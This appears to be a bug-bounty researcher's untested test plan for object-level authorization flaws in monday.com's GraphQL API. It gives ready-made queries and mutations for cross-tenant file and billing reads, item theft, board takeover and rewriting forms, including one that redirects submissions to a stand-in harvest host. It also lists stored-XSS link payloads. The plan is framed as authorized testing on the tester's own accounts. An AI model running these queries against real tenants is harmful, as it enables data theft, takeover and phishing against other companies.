# monday.com GraphQL — second pass: object-level authorization

The first pass (`graphql-findings.md`) chased what the schema *says*. This pass chases
what its **shape** implies: every field that takes an identifier for an object the caller
may not own. Broken object-level authorization (BOLA/IDOR) is the most-reported class in
GraphQL APIs, and this schema has a lot of surface for it.

Same rule as before: **none of this is tested.** Each item is a shape plus the exact query
that decides it.

**The whole method is two accounts.** Token A, object ID from account B. If A reads or
writes B's object, that is a finding. If it stays inside one account it is almost always
intended behaviour and will be closed as such.

---

# A. Arbitrary-ID fetchers — top-level queries that take IDs directly

The schema exposes a lot of `thing(ids: [ID!])` queries. Every one is a BOLA test, and
they are cheap: one request each.

## IDOR-01 — `assets(ids: [ID!]!)` — arbitrary file fetch

**Severity:** Critical if it crosses tenants · **Why this is the best one here**

```graphql
assets(ids: [ID!]!): [Asset]

type Asset {
  id: ID!  name: String!  file_extension: String!  file_size: Int!
  url: String!            # "url to view the asset."
  public_url: String!     # "public url to the asset, valid for 1 hour."
  uploaded_by: User!
}
```

`public_url` is, by its own description, a URL that works **without further
authentication for an hour**. So a successful cross-tenant call here does not merely
leak metadata — it hands you a working download link for someone else's uploaded file.
Asset IDs are numeric and adjacent to your own.

```graphql
{ assets(ids: ["<ID FROM ACCOUNT B>"]) {
    id name file_extension file_size public_url uploaded_by { id name email } } }
```

**Confirmed if:** you get a name or `public_url` for a file you did not upload. Fetch the
`public_url` to demonstrate impact — that is what makes the report land.

**How to get IDs:** upload a file on your own account, note its ID, then walk a few IDs
either side. Sequential neighbours belong to other tenants.

## IDOR-02 — `app_subscriptions(account_id: Int)` — other accounts' billing

**Severity:** High

```graphql
app_subscriptions(app_id: ID!, status: SubscriptionStatus,
                  account_id: Int, cursor: String, limit: Int): AppSubscriptions!

type AppSubscriptionDetails {
  account_id: Int!  plan_id: String!  monthly_price: Float!  currency: String!
  renewal_date: String  days_left: Int!  max_units: Int
  discounts: [SubscriptionDiscount!]!
}
```

The query takes an **`account_id` filter as a plain argument**. If it is not constrained
to the caller's own account, this returns what another company pays, in which currency,
on which plan, renewing when, with what discounts. Commercially sensitive, and the sort
of thing a program triages seriously.

```graphql
{ app_subscriptions(app_id: "<any app>", account_id: <B_ACCOUNT_ID>)
  { total_count subscriptions { account_id plan_id monthly_price currency
                                renewal_date max_units discounts { value } } } }
```

Its sibling does the same for installs:

```graphql
{ app_installs(app_id: "<app>", account_id: "<B_ACCOUNT>")
  { app_id app_install_account { id } app_install_user { id }
    permissions { approved_scopes required_scopes } timestamp } }
```

`marketplace_app_discounts(app_id:)` is the third of the set — it returns
`account_slug`, `account_id`, `discount`, `valid_until` per discount.

## IDOR-03 — `connection(id: Int!)` — integration connections

**Severity:** Medium–High

```graphql
connection(id: Int!): Connection

type Connection {
  id: Int  accountId: Int  userId: Int
  provider: String                    # gmail, slack, ...
  providerAccountIdentifier: String   # "Identifier of the linked account at the provider side"
  method: String  state: String
}
```

A bare sequential integer identifying an OAuth integration. `providerAccountIdentifier`
is the linked external account — which Gmail address, which Slack workspace. Walking the
integer space maps who has connected what across the platform.

Note the neighbouring query documents its own gate: `account_connections` says
**"Requires admin privileges."** `connection(id:)` says nothing. That asymmetry is the
tell — one was thought about, the other may not have been.

```graphql
{ connection(id: <N>) { id accountId userId provider providerAccountIdentifier state } }
{ account_connections { id provider providerAccountIdentifier } }   # run as NON-admin
{ connection_board_ids(connection_id: "<N>") }
```

## IDOR-04 — the rest of the ID-taking queries

Same test, one request each. Use an ID from account B.

| Query | Returns |
|---|---|
| `items(ids: [ID!])` | item name, column values, board |
| `boards(ids: [ID!])` | board contents, subscribers, permissions |
| `docs(ids:, object_ids:)` | document blocks |
| `updates(ids: [ID!])` | comment bodies |
| `teams(ids:)` / `tags(ids:)` | team membership |
| `sprints(ids: [ID!]!)` | dev sprint items and snapshots |
| `webhooks(board_id: ID!)` | `Webhook.config` — endpoint URLs and config |
| `timeline_item(id: ID!)` | email `from`/`to`/`cc`/`bcc` via `EmailTimelineItemMetadata` |
| `custom_activity(ids:)` | activity definitions |
| `managed_column(id: [String!])` | column settings |
| `get_object_schemas(ids:, names:)` | account schema structure |
| `form(formToken: String!)` | full form definition — see IDOR-08 |
| `job_status(job_id: ID!)` / `fetch_job_status` | job results, report URLs |
| `article_blocks(object_id: ID!)` / `articles(object_ids:)` | knowledge base content |
| `doc_version_history(doc_id:)` / `doc_version_diff` | who edited what, when |
| `export_graph(boardId: String!)` | full dependency graph of a board |
| `board_dependencies(board_id:)` / `item_dependency` | board structure |
| `aggregate(query: {from: {id: "<board>"}})` | see IDOR-09 |

`ItemsJobStatus` and `BulkImportStatus` both expose `report_url` — "URL to download the
job report, valid for 10 minutes". Another pre-authenticated URL, reachable by job ID.

---

# B. Write-side IDOR — the higher-severity half

Reads leak. Writes take over. These take an ID for someone else's object **and change it**.

## IDOR-05 — `move_item_to_board` / `duplicate_item` — item theft

**Severity:** High · **This is the sharpest write shape in the schema**

```graphql
move_item_to_board(board_id: ID!, group_id: ID!, item_id: ID!, ...): Item
duplicate_item(board_id: ID!, item_id: ID, with_updates: Boolean): Item
```

Two identifiers, two different owners possible. The natural implementation authorises the
**destination** `board_id` — which is yours, so the check passes — and then acts on
`item_id`. If the source item is not separately authorised, you pull another tenant's item,
with its column values and (with `with_updates: true`) its entire comment history, into a
board you control.

That is a complete data-theft primitive with a single mutation, and it reads as a normal
product operation, so it is exactly the kind of check that gets missed.

```graphql
mutation { duplicate_item(board_id: "<YOUR BOARD>", item_id: "<THEIR ITEM>",
                          with_updates: true) { id name url } }
```

**Confirmed if:** an item appears on your board that you did not own. `move_item_to_board`
is the destructive twin — test `duplicate_item` first; it copies rather than moves.

## IDOR-06 — `add_users_to_board(kind: owner)` — board takeover

**Severity:** Critical if unauthorised

```graphql
add_users_to_board(board_id: ID!, user_ids: [ID!]!,
                   kind: BoardSubscriberKind = subscriber): [User]
add_subscribers_to_object(id: ID!, user_ids: [ID!]!, kind: SubscriberKind = SUBSCRIBER): Object
set_board_permission(board_id: ID!, basic_role_name: BoardBasicRoleName, ...)
```

Add **yourself** as `owner` to a board you have no access to. If the authorisation check is
on membership rather than ownership — or missing — this is full takeover of any board by ID.
`add_subscribers_to_object` is the same operation on the newer Objects Platform and may not
share the older mutation's checks.

```graphql
mutation { add_users_to_board(board_id: "<NOT YOURS>",
                              user_ids: ["<YOUR USER ID>"], kind: owner) { id name } }
```

## IDOR-07 — update mutations that take only an update ID

**Severity:** Medium–High

```graphql
edit_update(id: ID!, body: String!): Update!
delete_update(id: ID!): Update
like_update(update_id: ID!, reaction_type: String): Update
pin_to_top(id: ID!, item_id: ID): Update!
clear_item_updates(item_id: ID!): Item
add_file_to_update(update_id: ID!, file: File!): Asset
```

`edit_update` rewrites the body of an update identified by a bare ID. Editing another
user's comment is content forgery — you can put words in a colleague's mouth inside their
own board. `clear_item_updates` wipes an entire item's discussion by item ID.

Note the audit trail: `Update.edited_at` and `Update.creator` stay as they were, so an
edit by a third party is not obviously visible.

## IDOR-08 — form mutations may be gated only by the token in the URL

**Severity:** Medium–High · **Confidence:** an asymmetry in the schema's own wording

The **query** documents a permission requirement:

> `form(formToken: String!)` — "Requires that the requesting user has read access to the
> associated board."

Every form **mutation** documents only the token:

> `formToken` — "The unique identifier token for the form. Required for all form-specific
> operations."

Fourteen mutations take `formToken` and nothing else identifying: `update_form`,
`update_form_settings`, `create_form_question`, `update_form_question`, `delete_question`,
`activate_form`, `deactivate_form`, `set_form_password`, `create_form_tag`,
`delete_form_tag`, `shorten_form_url`. The read path states a board-access requirement and
the write paths do not. If the token is the only gate, then **anyone with a form's public
link can rewrite that form**.

Two specific consequences:

```graphql
# 1. disable a form's password protection
#    FormPasswordInput: "Boolean disabling password protection. Can only be updated to false"
mutation { update_form_settings(formToken: "<TOKEN FROM A PUBLIC FORM URL>",
  settings: { features: { password: { enabled: false } } }) { id token active } }

# 2. point the post-submission redirect at your own site
mutation { update_form_settings(formToken: "<TOKEN>", settings: { features: {
  afterSubmissionView: { redirectAfterSubmission: {
    enabled: true, redirectUrl: "https://your-site.example/harvest" } } } }) { id } }
```

**Test on your own form first**, from a second account that has never been given board
access. If it succeeds, the token alone is the authorisation.

## IDOR-09 — `aggregate` as an inference channel

**Severity:** Medium

```graphql
aggregate(query: AggregateQueryInput!): AggregateQueryResult
# from: { type: TABLE, id: "<board id>" }
# select: SUM / MIN / MAX / COUNT_DISTINCT / MEDIAN / AVERAGE / FIRST / CASE ...
```

A SQL-shaped engine over board data. Two questions:

1. Is `from.id` authorised at all? Point it at a board you cannot read.
2. Even where reads are blocked, do **aggregates** leak? `MIN`/`MAX`/`COUNT_DISTINCT`
   over a hidden column is a classic inference channel — you reconstruct values without
   ever being allowed to select them. `group_by` on a column returns the distinct values
   themselves, which is disclosure with extra steps.

```graphql
{ aggregate(query: {
    from: { type: TABLE, id: "<BOARD YOU CANNOT READ>" },
    select: [{ type: FUNCTION, function: { function: COUNT_ITEMS }, as: "n" }] })
  { results { entries { alias value { ... on AggregateBasicAggregationResult { result } } } } } }
```

---

# C. Abuse primitives that are not IDOR

## ABUSE-01 — `create_notification` — arbitrary in-app notifications

**Severity:** Medium (phishing)

```graphql
create_notification(user_id: ID!, target_id: ID!,
                    target_type: NotificationTargetType!, text: String!): Notification
```

Arbitrary `text` delivered as a native monday.com notification to an arbitrary `user_id`.
In-app notifications carry the platform's trust. Two escalations to test: does `user_id`
have to be in your account, and does `text` render any markup or links?

## ABUSE-02 — creator spoofing

```graphql
create_update(..., use_app_info: Boolean)      # "Use app info for the post creator."
create_timeline_item(..., user_id: Int)        # "The user who created the timeline item.
                                               #  Only for account admins."
```

`create_timeline_item` documents an admin restriction on `user_id`. Test it **as a plain
member** — a documented restriction is a testable claim. Success is attribution forgery:
a timeline entry attributed to someone else.

## ABUSE-03 — stored XSS via the rich-text link attribute

**Severity:** Medium

```graphql
input AttributesInput { link: String   # "URL to create a hyperlink" ... }
```

Doc and article content is built from delta operations whose attributes include a
free-form `link`. The scheme is unconstrained in the schema. `javascript:`,
`data:text/html`, and `vbscript:` are the payloads; the sink is every viewer of the doc.

Related sinks: `import_doc_from_html(html: String!)`, `create_update(body:)` ("html
formatted body"), `update_article_block(content: JSON!)`,
`CampaignsEmailCampaign.template_html`.

## ABUSE-04 — complexity accounting

```graphql
complexity { before after query reset_in_x_seconds }   # on BOTH Query and Mutation
```

The API tells you your own remaining budget, which makes the accounting itself testable.
Two things to try: aliasing one expensive field N times (counted once or N times?), and
nesting the paginators — `boards(limit:) { items_page(limit: 500) { items { updates(limit:)
{ replies { ... } } } } }`. Most programs treat resource exhaustion as out of scope, so
check the policy before spending time here.

---

# D. What to test, in order

Cheapest-to-strongest. Every one is a single request.

1. **IDOR-01 `assets(ids:)`** — one query, and a hit gives you a downloadable file.
2. **IDOR-02 `app_subscriptions(account_id:)`** — one query, other companies' billing.
3. **IDOR-04 sweep** — `items`, `boards`, `docs`, `updates`, `webhooks` with B's IDs.
4. **IDOR-03 `connection(id:)`** — walk a few integers.
5. **IDOR-05 `duplicate_item`** — the strongest write, and non-destructive (it copies).
6. **IDOR-08 form mutations** — needs a second account with no board access.
7. **IDOR-06 `add_users_to_board(kind: owner)`** — highest severity, test last, own boards only.

Run `python3 tools/gqlprobe.py idor --b-* ...` for 1–4; it does the sweep and flags
anything that resolves.

**Never against accounts you do not own:** `move_item_to_board`, `delete_update`,
`clear_item_updates`, `delete_object`, `bulk_delete_items`, `revoke_service_user_tokens`,
`delete_board`. Read and copy operations only, until you have a controlled second account.
